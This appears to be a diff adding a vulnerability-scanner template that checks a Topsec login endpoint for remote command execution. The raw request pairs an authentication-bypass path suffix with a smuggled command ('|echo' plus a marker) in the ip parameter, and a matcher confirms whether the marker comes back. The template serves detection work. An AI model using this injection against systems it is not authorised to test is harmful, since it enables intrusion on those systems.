@@ -1,0 +1,22 @@
+id: topsec-topsag-login-rce
+
+info:
+  name: topsec-topsag-login-rce
+  author: unknow
+  severity: high
+  tags: topsec
+
+http:
+  - raw:
+      - |
+        POST /iam/synRequest.do;.login.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+        method=trace_route&w=1&ip=127.0.0.1|echo%20B2a670e17079fD8d%3b&m=10
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"B2a670e17079fD8d")
